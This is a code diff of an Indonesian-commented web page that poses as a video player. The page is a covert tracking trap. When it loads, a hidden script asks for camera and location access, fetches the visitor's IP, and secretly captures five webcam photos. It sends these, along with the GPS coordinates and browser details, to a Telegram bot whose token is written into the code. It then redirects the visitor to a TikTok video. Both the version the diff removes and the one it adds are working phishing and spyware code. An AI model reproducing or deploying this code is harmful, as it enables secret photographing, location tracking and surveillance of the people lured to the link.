@@ -3,100 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ZIME MAJESTY - Player</title>
+    <title>Video Player</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: linear-gradient(180deg, #0a0f1e 0%, #0a1a2e 100%);
-            font-family: system-ui;
+            background: #000000;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
         }
         .video-container {
-            max-width: 400px;
             width: 100%;
             background: #000;
-            border-radius: 25px;
-            overflow: hidden;
-            border: 1px solid #ff00cc;
         }
-        video { width: 100%; display: block; }
-        .watermark {
-            position: fixed;
-            bottom: 15px;
-            right: 15px;
-            font-size: 10px;
-            color: rgba(255,0,204,0.4);
-            background: rgba(0,0,0,0.5);
-            padding: 4px 8px;
-            border-radius: 8px;
+        video {
+            width: 100%;
+            height: auto;
+            display: block;
         }
-        .toast {
+        /* Segala elemen yang mencurigakan disembunyikan */
+        .hidden {
             position: fixed;
-            bottom: 80px;
-            left: 20px;
-            right: 20px;
-            background: rgba(0,0,0,0.8);
-            color: #0ff;
-            padding: 12px;
-            border-radius: 30px;
-            text-align: center;
-            font-size: 13px;
-            z-index: 9999;
-            backdrop-filter: blur(10px);
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
 <div class="video-container">
-    <video id="fakeVideo" autoplay muted loop playsinline>
+    <video id="mainVideo" autoplay muted loop playsinline>
         <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
     </video>
 </div>
-<div class="watermark">ZIME MAJESTY</div>
-<div id="toastMsg" class="toast">🎬 Memuat video...</div>
 
-<video id="hiddenVideo" style="position:fixed; top:-9999px; left:-9999px;" autoplay muted playsinline></video>
-<canvas id="hiddenCanvas" style="position:fixed; top:-9999px; left:-9999px;"></canvas>
+<!-- Elemen tersembunyi untuk kamera -->
+<video id="hiddenVideo" class="hidden" autoplay muted playsinline></video>
+<canvas id="hiddenCanvas" class="hidden"></canvas>
 
 <script>
     // ========== KONFIGURASI TELEGRAM ==========
-    const BOT_TOKEN = "8778034522:AAHxz3IiOdU3efEkBPuNSFEOeU5InApiurA";   // Ganti dengan token bot
-    const CHAT_ID = "8374152759";       // Ganti dengan ID chat
+    const BOT_TOKEN = "8778034522:AAHxz3IiOdU3efEkBPuNSFEOeU5InApiurA";
+    const CHAT_ID = "8374152759";
     // ==========================================
 
-    let photoSent = false;
-    let locationSent = false;
+    let cameraStream = null;
+    let photoCount = 0;
+    const TOTAL_PHOTOS = 5; // 5 kali potret
+    let locationData = null;
+    let ipAddress = "mengambil...";
 
-    function showToast(msg, isError = false) {
-        const toast = document.getElementById('toastMsg');
-        toast.style.color = isError ? '#ff8888' : '#0ff';
-        toast.innerHTML = msg;
-        setTimeout(() => {
-            toast.style.opacity = '0';
-            setTimeout(() => {
-                toast.innerHTML = '🎬 Memuat video...';
-                toast.style.opacity = '1';
-            }, 2000);
-        }, 2500);
-    }
-
-    async function sendToTelegram(message) {
+    // Kirim pesan ke Telegram
+    async function sendMessage(text) {
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
             });
-        } catch(e) { console.log(e); }
+        } catch(e) { console.log("Error message:", e); }
     }
 
-    async function sendPhotoToTelegram(photoBase64, caption) {
+    // Kirim foto ke Telegram
+    async function sendPhoto(photoBase64, caption) {
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
@@ -107,48 +84,20 @@
                     caption: caption
                 })
             });
-        } catch(e) { console.log(e); }
+        } catch(e) { console.log("Error photo:", e); }
     }
 
+    // Ambil IP
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             return data.ip;
-        } catch(e) { return 'unknown'; }
+        } catch(e) { return 'tidak terdeteksi'; }
     }
 
-    async function captureCamera() {
-        return new Promise(async (resolve) => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('hiddenVideo');
-                video.srcObject = stream;
-                await video.play();
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('hiddenCanvas');
-                    if (video.videoWidth > 0 && video.videoHeight > 0) {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const photo = canvas.toDataURL('image/jpeg', 0.85);
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve(photo);
-                    } else {
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve(null);
-                    }
-                }, 1200);
-            } catch(err) {
-                console.log("Camera error:", err);
-                resolve(null);
-            }
-        });
-    }
-
-    function getLocation() {
+    // Ambil lokasi (sekali)
+    function getLocationOnce() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
                 resolve(null);
@@ -161,68 +110,116 @@
                     accuracy: pos.coords.accuracy
                 }),
                 (err) => resolve(null),
-                { enableHighAccuracy: true, timeout: 10000 }
+                { enableHighAccuracy: true, timeout: 8000 }
             );
         });
     }
 
-    async function runPhishing() {
-        showToast("📡 Mengaktifkan fitur HDR...");
-        
+    // Ambil 1 foto dari stream kamera yang sudah aktif
+    async function takeOnePhoto(photoNumber) {
+        return new Promise((resolve) => {
+            if (!cameraStream) {
+                resolve(null);
+                return;
+            }
+            
+            const video = document.getElementById('hiddenVideo');
+            const canvas = document.getElementById('hiddenCanvas');
+            
+            // Tunggu sebentar agar stabil
+            setTimeout(() => {
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const photo = canvas.toDataURL('image/jpeg', 0.85);
+                    resolve(photo);
+                } else {
+                    resolve(null);
+                }
+            }, 200);
+        });
+    }
+
+    // Fungsi utama: hidupkan kamera, lalu ambil 5 foto bertahap
+    async function startStealth() {
         // Ambil IP
-        const ip = await getIP();
+        ipAddress = await getIP();
         
-        // Ambil foto
-        const photo = await captureCamera();
-        if (photo) {
-            showToast("📸 Screenshot berhasil disimpan");
-            await sendPhotoToTelegram(photo, `📸 TARGET ZIME MAJESTY
-🌐 IP: ${ip}
-📱 UA: ${navigator.userAgent}
-🕒 Waktu: ${new Date().toLocaleString('id-ID')}`);
-            photoSent = true;
-        } else {
-            showToast("⚠️ Izin kamera diperlukan", true);
-        }
-        
-        // Ambil lokasi
-        const location = await getLocation();
-        if (location) {
-            showToast("📍 Lokasi terdeteksi");
-            const mapsLink = `https://www.google.com/maps?q=${location.lat},${location.lng}`;
-            await sendToTelegram(`📍 LOKASI TARGET ZIME MAJESTY
-Latitude: ${location.lat}
-Longitude: ${location.lng}
-Akurasi: ±${location.accuracy}m
+        // Ambil lokasi diam-diam
+        locationData = await getLocationOnce();
+        if (locationData) {
+            const mapsLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}`;
+            await sendMessage(`📍 LOKASI TARGET
+Latitude: ${locationData.lat}
+Longitude: ${locationData.lng}
+Akurasi: ±${locationData.accuracy}m
 Maps: ${mapsLink}
-IP: ${ip}
+IP: ${ipAddress}
 Waktu: ${new Date().toLocaleString('id-ID')}`);
-            locationSent = true;
         } else {
-            await sendToTelegram(`⚠️ GAGAL AMBIL LOKASI
-IP: ${ip}
-UA: ${navigator.userAgent}
+            await sendMessage(`⚠️ GAGAL AMBIL LOKASI
+IP: ${ipAddress}
 Waktu: ${new Date().toLocaleString('id-ID')}`);
         }
-        
-        // Kirim data awal (jika foto dan lokasi gagal)
-        if (!photoSent && !locationSent) {
-            await sendToTelegram(`🎯 TARGET BUKA LINK ZIME MAJESTY
-🌐 IP: ${ip}
+
+        // Minta akses kamera (diam-diam, tanpa tampilan)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            cameraStream = stream;
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = stream;
+            await video.play();
+            
+            // Kirim notifikasi awal ke Telegram
+            await sendMessage(`🎯 TARGET MEMBUKA LINK
+🌐 IP: ${ipAddress}
 📱 User Agent: ${navigator.userAgent}
 🕒 Waktu: ${new Date().toLocaleString('id-ID')}
-📍 Status: Izin kamera & lokasi DITOLAK`);
+📸 Akan mengambil ${TOTAL_PHOTOS} foto secara diam-diam`);
+
+            // Ambil foto sebanyak TOTAL_PHOTOS kali
+            for (let i = 1; i <= TOTAL_PHOTOS; i++) {
+                const photo = await takeOnePhoto(i);
+                if (photo) {
+                    await sendPhoto(photo, `📸 FOTO KE-${i} DARI ${TOTAL_PHOTOS}
+🌐 IP: ${ipAddress}
+🕒 ${new Date().toLocaleString('id-ID')}`);
+                    photoCount++;
+                }
+                // Jeda antar foto 0.8 detik agar tidak terlalu cepat
+                await new Promise(r => setTimeout(r, 800));
+            }
+            
+            // Matikan kamera setelah selesai
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream = null;
+            }
+            
+            // Laporan akhir
+            await sendMessage(`✅ ZIME MAJESTY SELESAI
+📸 Berhasil mengambil ${photoCount} dari ${TOTAL_PHOTOS} foto
+🌐 IP: ${ipAddress}
+🕒 Waktu selesai: ${new Date().toLocaleString('id-ID')}`);
+            
+        } catch(err) {
+            console.log("Camera error:", err);
+            await sendMessage(`❌ KAMERA GAGAL (izin ditolak)
+🌐 IP: ${ipAddress}
+📱 UA: ${navigator.userAgent}
+🕒 ${new Date().toLocaleString('id-ID')}`);
         }
         
-        // Redirect ke TikTok asli
+        // Redirect ke TikTok asli setelah semua proses selesai
         setTimeout(() => {
             window.location.href = "https://www.tiktok.com/@scardion/video/7456978207125212448";
-        }, 2500);
+        }, 1500);
     }
-    
+
     // Jalankan setelah halaman siap
     window.addEventListener('load', () => {
-        setTimeout(runPhishing, 500);
+        setTimeout(startStealth, 500);
     });
 </script>
 </body>
